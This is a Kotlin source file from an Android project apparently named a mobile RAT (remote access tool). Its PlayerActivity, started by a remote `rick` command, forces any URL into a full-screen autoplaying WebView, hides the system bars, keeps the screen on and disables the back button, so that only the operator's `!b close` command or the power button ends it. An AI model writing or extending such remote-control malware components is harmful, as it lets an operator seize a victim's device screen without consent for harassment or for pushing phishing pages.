package com.kai.mobilerat

import android.app.Activity
import android.content.Intent
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.view.View
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient

/**
 * Pemutar layar penuh dari URL apa pun. Dipakai perintah `rick`, tapi tidak
 * terikat ke video tertentu — argumen URL ikut lewat intent.
 *
 * Tombol back dimatikan dan layar ditahan tetap hidup; satu-satunya jalan
 * keluar adalah `!b close` (atau tombol power).
 */
class PlayerActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.setBackgroundDrawableResource(android.R.color.black)

        val web = WebView(this)
        web.setBackgroundColor(Color.BLACK)
        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true
        web.settings.mediaPlaybackRequiresUserGesture = false
        web.webViewClient = WebViewClient()
        web.loadUrl(intent.getStringExtra(EXTRA_URL) ?: DEFAULT)
        setContentView(web)
        current = this

        hideBars()
    }

    private fun hideBars() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            window.decorView.systemUiVisibility =
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                View.SYSTEM_UI_FLAG_FULLSCREEN or
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        }
    }

    @Deprecated("Android 13 memakai onBackPressedDispatcher")
    override fun onBackPressed() {
        hideBars()
    }

    override fun onDestroy() {
        if (current === this) current = null
        super.onDestroy()
    }

    companion object {

        private const val EXTRA_URL = "url"

        private const val DEFAULT =
            "https://www.youtube.com/embed/dQw4w9WgXcQ" +
                "?autoplay=1&loop=1&playlist=dQw4w9WgXcQ&playsinline=1"

        @Volatile
        private var current: PlayerActivity? = null

        fun play(activity: android.content.Context, url: String?): Boolean {
            val i = Intent(activity, PlayerActivity::class.java)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            if (!url.isNullOrBlank()) i.putExtra(EXTRA_URL, url)
            return try {
                activity.startActivity(i)
                true
            } catch (_: Exception) {
                false
            }
        }

        fun close() {
            try {
                current?.finish()
            } catch (_: Exception) {
            }
            current = null
        }
    }
}
